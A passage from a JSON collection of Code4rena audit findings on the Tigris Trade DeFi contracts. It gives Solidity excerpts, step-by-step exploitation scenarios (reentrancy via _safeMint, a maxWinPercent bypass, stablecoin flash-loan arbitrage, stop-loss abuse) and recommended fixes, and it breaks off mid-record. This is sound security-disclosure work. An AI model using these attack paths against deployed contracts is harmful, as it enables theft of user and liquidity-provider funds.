      "content": "\nSome tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero and then the actual allowance must be approved.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117>\n\n```solidity\n    function claimGovFees() public {\n        address[] memory assets = bondNFT.getAssets();\n\n        for (uint i=0; i < assets.length; i++) {\n            uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));\n            IGovNFT(govNFT).claim(assets[i]);\n            uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));\n            IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);// @audit this could fail always with some tokens, \n            bondNFT.distribute(assets[i], balanceAfter - balanceBefore);\n        }\n    }\n```\n\n### Recommended Mitigation Steps\n\nAdd an `approve(0)` before approving;\n\n        function claimGovFees() public {\n            address[] memory assets = bondNFT.getAssets();\n\n            for (uint i=0; i < assets.length; i++) {\n                uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));\n                IGovNFT(govNFT).claim(assets[i]);\n                uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));\n                IERC20(assets[i]).approve(address(bondNFT), 0);\n                IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);\n                bondNFT.distribute(assets[i], balanceAfter - balanceBefore);\n            }\n      }\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/104#issuecomment-1382253859):**\n > The Warden has shown how, due to the function approving max multiple times, certain tokens, that only allow a non-zero allowance to be set starting from zero, could revert.\n> \n> Because this depends on the token implementation, but there's a reasonable chance to believe that USDT will be used, I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/104#issuecomment-1406959434):**\n > Since the purpose of the bonds is to lock tigAsset liquidity, only tigAsset tokens will be allowed to be locked, which don't have this issue.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/104#issuecomment-1407862000):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177578 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue that affects some tokens (like USDT) when changing the allowance from an existing non-zero allowance value. It was discovered when manually revising the code found at https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117. The impact of this bug is that the tokens do not work when changing the allowance from an existing non-zero allowance value. The recommended mitigation step is to add an approve(0) before approving. This can be done by modifying the code as follows: \n\n```\n    function claimGovFees() public {\n        address[] memory assets = bondNFT.getAssets();\n\n        for (uint i=0; i < assets.length; i++) {\n            uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));\n            IGovNFT(govNFT).claim(assets[i]);\n            uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));\n            IERC20(assets[i]).approve(address(bondNFT), 0);\n            IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);\n            bondNFT.distribute(assets[i], balanceAfter - balanceBefore);\n        }\n    }\n```",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/104",
      "tags": [],
      "finders": [
        "__141345__",
        "Deivitto",
        "0x4non",
        "0xNazgul",
        "cccz",
        "kwhuo68",
        "imare",
        "rvierdiiev",
        "eierina"
      ]
    },
    {
      "id": "6331",
      "title": "[M-01] Lock.sol: claimGovFees function can cause assets to be stuck in the Lock contract",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215>\n\n### Impact\n\nWhen calling [`Lock.claimGovFees`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110), assets that are set to be not allowed or assets that don't have any shares yet in the `BondNFT` contract will cause a silent failure in [`BondNFT.distribute`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215).\n\nThe funds from the `GovNFT` contract will get transferred into the `Lock` contract and then will be stuck there. They cannot be recovered.\n\n### Proof of Concept\n\n1.  An asset is added to the `BondNFT` contract by calling [`BondNFT.addAsset`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L349)\n2.  There are no bonds yet for this asset so the amount of shares for the asset is zero\n3.  [`Lock.claimGovFees`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110) is called\n4.  Funds are transferred from the `GovNFT` contract to the [`Lock` contract](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L115)\n5.  The call to `BondNFT.distribute` now fails quietly without reverting the transaction:\n    ```solidity\n     if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n    ```\n6.  The funds are now stuck in the `Lock` contract. They cannot be recovered.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nA naive solution would be to use `revert` instead of `return` in `BondNFT.distribute` such that funds are either transferred from `GovNFT` to `Lock` and then to `BondNFT` or not at all.\n\n```solidity\n     ) external {\n-        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n+        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) revert;\n         IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n         unchecked {\n             uint aEpoch = block.timestamp / DAY;\n```\n\nThis however is an incomplete fix because if there is a single \"bad\" asset, rewards for the other assets cannot be distributed either.\n\nMoreover functions like `Lock.lock` and `Lock.release` rely on `Lock.claimGovFees` to not revert.\n\nSo you might allow the owner to rescue stuck tokens from the `Lock` contract. Of course only allow rescuing the balance of the `Lock` contract minus the `totalLocked` of the asset in the `Lock` contract such that the locked amount cannot be rescued.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1362229612):**\n > Looks off, the transferFrom would happen [after the check](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215).\n> \n> If `totalShares` is zero, the funds will not be pulled.\n> \n> Will double check but looks invalid.\n\n**[TriHaz (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1363636606):**\n > @Alex the Entreprenerd it is valid, funds will not be pulled to `BondNFT`, but they will be stuck in `Lock`.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1384498101):**\n > The warden has shown how, whenever the `totalShares` for an asset are zero, or an asset is not allowed, the call to distribute will result in a no-op.\n >\n> Because `claimGovFees` uses a delta balance, this means that those tokens will be stuck in the Lock Contract.\n> \n> Because this finding shows a way to lose yield, due to an external condition, I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1407131168):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173369 \n\n\n\n***\n\n",
      "summary": "\nThis bug report describes an issue in the code of the Lock and BondNFT contracts. When the Lock.claimGovFees function is called, assets that are set to be not allowed or assets that don't have any shares yet in the BondNFT contract will cause a silent failure in BondNFT.distribute. This means that the funds from the GovNFT contract will get transferred into the Lock contract and then will be stuck there. The funds cannot be recovered.\n\nThe bug report provides a proof of concept which outlines the steps that need to be taken to reproduce the bug. It also provides the tools used to identify the bug.\n\nThe recommended mitigation steps suggest that a naive solution would be to use revert instead of return in BondNFT.distribute, such that funds are either transferred from GovNFT to Lock and then to BondNFT or not at all. However, this is an incomplete fix because if there is a single \"bad\" asset, rewards for the other assets cannot be distributed either. The bug report also suggests that the owner should be allowed to rescue stuck tokens from the Lock contract.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/73",
      "tags": [],
      "finders": [
        "__141345__  0xdeadbeef0x",
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "6330",
      "title": "[H-11] Not enough margin pulled or burned from user when adding to a position",
      "impact": "HIGH",
      "content": "\nWhen adding to a position, the amount of margin pulled from the user is not as much as it should be, which leaks value from the protocol, lowering the collateralization ratio of `tigAsset`.\n\n### Proof of Concept\n\nIn `Trading.addToPosition` the `_handleDeposit` function is called like this:\n\n```js\n_handleDeposit(\n    _trade.tigAsset,\n    _marginAsset,\n    _addMargin - _fee,\n    _stableVault,\n    _permitData,\n    _trader\n);\n```\n\nThe third parameter with the value of `_addMargin - _fee` is the amount pulled (or burned in the case of using `tigAsset`) from the user. The `_fee` value is calculated as part of the position size like this:\n\n```js\nuint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false);\n```\n\nThe `_handleOpenFees` function mints `_tigAsset` to the referrer, to the `msg.sender` (if called by a function meant to be executed by bots) and to the protocol itself. Those minted tokens are supposed to be part of the `_addMargin` value paid by the user. Hence using `_addMargin - _fee` as the third parameter to `_handleDeposit` is going to pull or burn less margin than what was accounted for.\n\nAn example for correct usage can be seen in `initiateMarketOrder`:\n\n```js\nuint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n_handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n```\n\nHere the third parameter to `_handleDeposit` is not `_marginAfterFees` but `_tradeInfo.margin` which is what the user has input on and is supposed to pay.\n\n### Recommended Mitigation Steps\n\nIn `Trading.addToPosition` call the `_handleDeposit` function without subtracting the `_fee` value:\n\n```js\n_handleDeposit(\n    _trade.tigAsset,\n    _marginAsset,\n    _addMargin,\n    _stableVault,\n    _permitData,\n    _trader\n);\n```\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1374444369)**\n\n**[Alex the Entreprenerd (judge) increased severity to High and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1387116632):**\n > The Warden has shown how, due to an incorrect computation, less margin is used when adding to a position.\n> \n> While the loss of fees can be considered Medium Severity, I believe that the lack of checks is ultimately allowing for more leverage than intended which not only breaks invariants but can cause further issues (sponsor cited Fees as a defense mechanism against abuse).\n> \n> For this reason, I believe the finding to be of High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1407828021):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177303 \n\n***\n\n \n",
      "summary": "\nThis bug report is regarding a vulnerability in the code of the Trading.sol file. The vulnerability could lead to value leaking from the protocol and lowering the collateralization ratio of tigAsset. This is because when adding to a position, the amount of margin pulled from the user is not as much as it should be. \n\nThe issue is that in the _handleDeposit function, the third parameter is set to _addMargin - _fee, where the _fee value is calculated as part of the position size. This is incorrect as the _fee value should be part of the _addMargin value paid by the user. \n\nThe recommended mitigation step is to call the _handleDeposit function without subtracting the _fee value. This should be done in the Trading.addToPosition function. \n\nOverall, this bug report is about a vulnerability in the Trading.sol file which could lead to value leaking from the protocol and lowering the collateralization ratio of tigAsset. The recommended mitigation step is to call the _handleDeposit function without subtracting the _fee value.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/659",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "Jeiwan",
        "bin2chen",
        "Aymen0909",
        "KingNFT",
        "hansfriese",
        "rvierdiiev",
        "minhtrng",
        "0Kage"
      ]
    },
    {
      "id": "6329",
      "title": "[H-10] User can abuse tight stop losses and high leverage to make risk free trades",
      "impact": "HIGH",
      "content": "\nUser can abuse how stop losses are priced to open high leverage trades with huge upside and very little downside.\n\n### Proof of Concept\n\n    function limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    )\n        external\n    {\n        _checkDelay(_id, false);\n        (uint _limitPrice, address _tigAsset) = tradingExtension._limitClose(_id, _tp, _priceData, _signature);\n        _closePosition(_id, DIVISION_CONSTANT, _limitPrice, address(0), _tigAsset, true);\n    }\n\n    function _limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) external view returns(uint _limitPrice, address _tigAsset) {\n        _checkGas();\n\n        IPosition.Trade memory _trade = position.trades(_id);\n        _tigAsset = _trade.tigAsset;\n        getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n        uint256 _price = _priceData.price;\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n        if (_tp) {\n            if (_trade.tpPrice == 0) revert(\"7\"); //LimitNotSet\n            if (_trade.direction) {\n                if (_trade.tpPrice > _price) revert(\"6\"); //LimitNotMet\n            } else {\n                if (_trade.tpPrice < _price) revert(\"6\"); //LimitNotMet\n            }\n            _limitPrice = _trade.tpPrice;\n        } else {\n            if (_trade.slPrice == 0) revert(\"7\"); //LimitNotSet\n            if (_trade.direction) {\n                if (_trade.slPrice < _price) revert(\"6\"); //LimitNotMet\n            } else {\n                if (_trade.slPrice > _price) revert(\"6\"); //LimitNotMet\n            }\n            //@audit stop loss is closed at user specified price NOT market price\n            _limitPrice = _trade.slPrice;\n        }\n    }\n\nWhen closing a position with a stop loss the user is closed at their SL price rather than the current price of the asset. A user could abuse this in directional markets with high leverage to make nearly risk free trades. A user could open a long with a stop loss that in $0.01 below the current price. If the price tanks immediately on the next update then they will be closed out at their entrance price, only out the fees to open and close their position. If the price goes up then they can make a large gain.\n\n### Recommended Mitigation Steps\n\nTake profit and stop loss trades should be executed at the current price rather than the price specified by the user:\n\n             if (_trade.tpPrice == 0) revert(\"7\"); //LimitNotSet\n            if (_trade.direction) {\n                if (_trade.tpPrice > _price) revert(\"6\"); //LimitNotMet\n            } else {\n                if (_trade.tpPrice < _price) revert(\"6\"); //LimitNotMet\n            }\n    -       _limitPrice = _trade.tpPrice;\n    +       _limitPrice = _price;\n        } else {\n            if (_trade.slPrice == 0) revert(\"7\"); //LimitNotSet\n            if (_trade.direction) {\n                if (_trade.slPrice < _price) revert(\"6\"); //LimitNotMet\n            } else {\n                if (_trade.slPrice > _price) revert(\"6\"); //LimitNotMet\n            }\n    -       _limitPrice = _trade.slPrice;\n    +       _limitPrice = _price;\n\n**[TriHaz (Tigris Trade) disputed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/622#issuecomment-1377385352):**\n > Because of open fees, close fees and spread, that wouldn't be profitable.\n >\n> We also have a cooldown after a trade is opened so there will be enough time for price to move freely past the sl.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/622#issuecomment-1385147387):**\n > The warden has shown a flaw in how the protocol offers Stop Losses.\n> \n> By using the originally stored value for Stop Loss, instead of just using it as a trigger, an attacker can perform a highly profitable strategy on the system as they know that their max risk is capped by the value of the Stop Loss, instead of the current asset price.\n> \n> This will happen at the detriment of LPs.\n> \n> Because the attack breaks an important invariant, causing a loss to other users, I agree with High Severity.\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that allows users to abuse how stop losses are priced to open high leverage trades with huge upside and very little downside. This is done by allowing users to close their positions at their stop loss or take profit price rather than the current market price when the order is executed. This could be abused in directional markets with high leverage to make nearly risk free trades. \n\nThe recommended mitigation steps to fix this vulnerability is to take profit and stop loss trades should be executed at the current price rather than the price specified by the user. This can be done by replacing the code that sets the limit price to the user specified price with the code that sets the limit price to the current market price.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/622",
      "tags": [],
      "finders": [
        "0x52",
        "hansfriese  noot"
      ]
    },
    {
      "id": "6328",
      "title": "[H-09] Users can bypass the maxWinPercent limit using a partially closing",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/b2ebb8ea1def4927a747e7a185174892506540ab/contracts/Trading.sol#L625-L627\n\n\n## Vulnerability details\n\n## Impact\nUsers can bypass the `maxWinPercent` limit using a partial closing.\n\nAs a result, users can receive more funds than their upper limit from the protocol.\n\n## Proof of Concept\nAs we can see from the [documentation](https://docs.tigris.trade/protocol/trading-and-fees#limitations), there is limitation of a maximum PnL.\n\n```\nMaximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually.\n```\n\nAnd this logic was implemented like below in `_closePosition()`.\n\n```solidity\nFile: 2022-12-tigris\\contracts\\Trading.sol\n624:                 _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n625:                 if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) { //@audit bypass limit\n626:                     _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n627:                 }\n```\n\nBut it checks the `maxWinPercent` between the partial payout and full margin so the below scenario is possible.\n\n1. Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees.\n2. If `maxWinPercent` = 500%, Alice should receive 500 at most.\n3. But Alice closed 50% of the position and she got 500 for a 50% margin because it checks `maxWinPercent` with `_toMint = 500` and `_trade.margin = 100`\n4. After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again.\n5. As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nWe should check the `maxWinPercent` between the partial payout and partial margin like below.\n\n```solidity\n    _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n\n    uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT; //+++++++++++++++++++++++\n    if (maxWinPercent > 0 && _toMint > partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) { \n        _toMint = partialMarginToClose*maxWinPercent/DIVISION_CONSTANT;\n    }\n```",
      "summary": "\nThis bug report concerns the code found in the Trading.sol file of the 2022-12-tigris repository on Github. It states that users can bypass the `maxWinPercent` limit set by the protocol with a partial closing. This means that the user can receive more funds than their upper limit from the protocol.\n\nThe bug is demonstrated by the following scenario: Alice opens an order with a margin of 100 and PnL of 1000. With a `maxWinPercent` of 500%, Alice should receive a maximum of 500. However, if Alice closes 50% of the position, she can receive 500 for a 50% margin because the `maxWinPercent` is checked with the `_toMint = 500` and `_trade.margin = 100`. This can be repeated, allowing Alice to withdraw almost 100% of the initial PnL (1000) even though she should only receive 500.\n\nThe bug was found through manual review. The recommended mitigation step is to check the `maxWinPercent` between the partial payout and partial margin. This can be done by adding the line `uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT;` and changing the if statement to `if (maxWinPercent > 0 && _toMint > partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) {`.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/507",
      "tags": [],
      "finders": [
        "0xA5DF",
        "bin2chen",
        "0x52",
        "hansfriese"
      ]
    },
    {
      "id": "6327",
      "title": "[H-08] Incorrect Assumption of Stablecoin Market Stability",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72>\n\n### Impact\n\nThe `StableVault` contract attempts to group all types of stablecoins under a single token which can be minted for any of the stablecoins supported by the system as well as burned for any of them.\n\nThis is at minimum a medium-severity vulnerability as the balance sheet of the `StableVault` will consist of multiple assets which do not have a one-to-one exchange ratio between them as can be observed by trading pools such as [Curve](https://curve.fi/#/ethereum/pools/3pool/deposit) as well as the [Chainlink oracle reported prices themselves](https://data.chain.link/ethereum/mainnet/stablecoins/usdc-usd).\n\nGiven that the contract exposes a 0% slippage 1-to-1 exchange between assets that in reality have varying prices, the balance sheet of the contract can be arbitraged (especially by flash-loans) to swap an undesirable asset (i.e. USDC which at the time of submission was valued at `0.99994853` USD) for a more desirable asset (i.e. USDT which at the time of submission was valued at `1.00000000` USD) acquiring an arbitrage in the price by selling the traded asset.\n\n### Proof of Concept\n\nTo illustrate the issue, simply view the exchange output you would get for swapping your USDC to USDT in a stablecoin pool (i.e. CurveFi) and then proceed to [invoke `deposit`](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51) with your USDC asset and retrieve your [incorrectly calculated `USDT` equivalent via `withdraw`](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72).\n\nThe arbitrage can be observed by assessing the difference in the trade outputs and can be capitalized by selling our newly acquired `USDT` for `USDC` on the stablecoin pair we assessed earlier, ultimately ending up with a greater amount of `USDC` than we started with. This type of attack can be extrapolated by utilizing a flash-loan rather than our personal funds.\n\n### Tools Used\n\n[Chainlink oracle resources](https://data.chain.link/popular)\n\n[Curve Finance pools](https://curve.fi/#/ethereum/pools)\n\n### Recommended Mitigation Steps\n\nWe advise the `StableVault` to utilize Chainlink oracles for evaluating the inflow of assets instead, ensuring that all inflows and outflows of stablecoins are fairly evaluated based on their \"neutral\" USD price rather than their subjective on-chain price or equality assumption.\n\n**[Alex the Entreprenerd (judge) increased severity to High and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/462#issuecomment-1359639245):**\n > The warden has shown how, due to an incorrect assumption, the system offers infinite leverage.\n> \n> This can be trivially exploited by arbitraging with any already available exchange.\n> \n> Depositors will incur a loss equal to the size of the arbitrage as the contract is always taking the losing side.\n> \n> I believe this should be High because of it's consistently losing nature.\n\n**[TriHaz (Tigris Trade) acknowledged and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/462#issuecomment-1377373227):**\n > We are aware of this issue, we will keep the vault with one token for now.\n\n\n***\n\n",
      "summary": "\nThe StableVault contract attempts to group all types of stablecoins under a single token, which can be minted or burned for any of the supported stablecoins. This is a medium-severity vulnerability as the balance sheet of the contract consists of multiple assets which do not have a one-to-one exchange ratio between them. This means that the contract exposes a 0% slippage 1-to-1 exchange between assets that in reality have varying prices. This can be exploited by an attacker to arbitrage the balance sheet of the contract, especially using flash-loans, to swap an undesirable asset for a more desirable one and gain an arbitrage in the price.\n\nTo illustrate the issue, the attacker can simply view the exchange output they would get for swapping their USDC to USDT in a stablecoin pool and then invoke the deposit with their USDC asset and withdraw the incorrectly calculated USDT equivalent. The arbitrage can be observed by assessing the difference in the trade outputs and can be capitalized by selling the newly acquired USDT for USDC on the stablecoin pair.\n\nThe issue was identified by manual review of the codebase, Chainlink oracle resources, and Curve Finance pools. To mitigate the issue, it is advised to utilize Chainlink oracles for evaluating the inflow of assets instead, ensuring that all inflows and outflows of stablecoins are fairly evaluated based on their \"neutral\" USD price rather than their subjective on-chain price or equality assumption.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/462",
      "tags": [],
      "finders": [
        "8olidity",
        "__141345__",
        "0xhacksmithh",
        "Secureverse",
        "SamGMK",
        "rotcivegaf",
        "Ruhum",
        "0xsomeone",
        "Tointer",
        "aviggiano",
        "Critical"
      ]
    },
    {
      "id": "6326",
      "title": "[H-07] reentrancy attack during mint() function in Position contract which can lead to removing of the other user’s limit orders or stealing contract funds because initId is set low value",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Position.sol#L126-L161\n\n\n## Vulnerability details\n\n## Impact\nFunction `Position.mint()` has been used in `initiateLimitOrder()` and `initiateMarketOrder()` and it doesn't follow check-effect-interaction pattern and code updates the values of `_limitOrders`, `initId`, `_openPositions` and `position _tokenIds` variables after making external call by using `safeMint()`. This would give attacker opportunity to reenter the Trading contract logics and perform malicious action while contract storage state is wrong. the only limitation of the attacker is that he need to bypass `_checkDelay()` checks. attacker can perform this action:\n1. call `initiateLimitOrder()` and create limit order with id equal to ID1 reenter (while `_limitOrders` for ID1 is not yet settled) with `cancelLimitOrder(ID1)` (no `checkDelay()` check) and remove other users limit orders because code would try to remove `_limitOrderIndexes[_asset][ID1]` position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in the `Position.burn()` code.\n2. call `initiateMarketOrder()` and create a position with ID1 and while `initId[ID1]` has not yet settled reenter the Trading with `addToPosition(ID1)` function (bypass `checkDelay()` because both action is opening) and increase the position size which would set `initId[ID1]` according to new position values but then when code execution returns to rest of `mint()` logic `initId[ID1]` would set by initial values of the positions which is very lower than what it should be and `initId[ID1]` has been used for calculating `accuredInterest` of the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.\n\n## Proof of Concept\nThis is `mint()` code in Position contract:\n```\n    function mint(\n        MintTrade memory _mintTrade\n    ) external onlyMinter {\n        uint newTokenID = _tokenIds.current();\n\n        Trade storage newTrade = _trades[newTokenID];\n        newTrade.margin = _mintTrade.margin;\n        newTrade.leverage = _mintTrade.leverage;\n        newTrade.asset = _mintTrade.asset;\n        newTrade.direction = _mintTrade.direction;\n        newTrade.price = _mintTrade.price;\n        newTrade.tpPrice = _mintTrade.tp;\n        newTrade.slPrice = _mintTrade.sl;\n        newTrade.orderType = _mintTrade.orderType;\n        newTrade.id = newTokenID;\n        newTrade.tigAsset = _mintTrade.tigAsset;\n\n        _safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usage\n        if (_mintTrade.orderType > 0) { // update the values of some storage functions\n            _limitOrders[_mintTrade.asset].push(newTokenID);\n            _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n        } else {\n            initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;\n            _openPositions.push(newTokenID);\n            _openPositionsIndexes[newTokenID] = _openPositions.length-1;\n\n            _assetOpenPositions[_mintTrade.asset].push(newTokenID);\n            _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n        }\n        _tokenIds.increment();\n    }\n```\nAs you can see by calling `_safeMint()` code would make external call to `onERC721Received()` function of the account address and the code sets the values for `_limitOrders[]`, `_limitOrderIndexes[]`, `initId[]`, `_openPositions[]`, `_openPositionsIndexes[]`, `_assetOpenPositions[]`, `_assetOpenPositionsIndexes[]` and `_tokenIds`. so code don't follow check-effect-interaction pattern and it's possible to perform reentrancy attack.\nthere could be multiple scenarios that attacker can perform the attack and do some damage. two of them are:\n\n\n**scenario #1 where attacker remove other users limit orders and create broken storage state**\n1. attacker contract would call `initiateLimitOrder()` and code would create the limit order and mint it in the `Position._safeMint()` with ID1.\n2. then code would call attacker address in `_safeMint()` function because of the `onERC721Received()` call check.\n3. variables `_limitOrders[]`, `_limitOrderIndexes[ID1]` are not yet updated for ID1 and `_limitOrderIndexes[ID1]` is 0x0 and ID1 is not in `_limitOrder[]` list.\n4. attacker contract would reenter the Trading contract by calling `cancelLimitOrder(ID1)`.\n5. `cancelLimitOrder()` checks would pass and would tries to call `Position.burn(ID1)`.\n6. `burn()` function would tries to remove ID1 from `_limitOrders[]` list but because `_limitOrderIndexes[ID1]` is 0 so code would remove the 0 index limit order which is belongs to another user.\n7. execution would return to `Position.mint()` logic and code would add burned id token to `_limitOrder[]` list.\n\nso there is two impact here, first other users limit order got removed and the second is that contract storage had bad state and burned tokens get stock in the list.\n\n\n**scenario #2 where attacker steal contract/users funds by wrong profit calculation**\n1. attacker's contract would call `initiateMarketOrder(lowMargin)` to create position with ID1 while the margin is low.\n2. code would mint position token for attacker and in `_safeMint()` would make external call and call `onERC721Received()` function of attacker address.\n3. the value of `initId[ID1]` is not yet set for ID1.\n4. attacker contract would call `addToPosition(ID1, bigMargin)` to increase the margin of the position the `_checkDelay()` check would pass because both actions are opening position.\n5. code would increase the margin of the position and set the value of the `initId[ID1]` by calling `position.addToPosition()` and the value were be based on the `newMargin`.\n6. the execution flow would receive the rest of `Position.mint()` function and code would set `initId[ID1]` based on old margin value.\n7. then the value of `initId[ID1]` for attacker position would be very low which would cause `accInterest` to be very higher than it supposed to be for position(in `Position.trades()` function calculations ) and would cause `_payout` value to be very high (in `pnl()` function's calculations) and when attacker close position ID1 attacker would receive 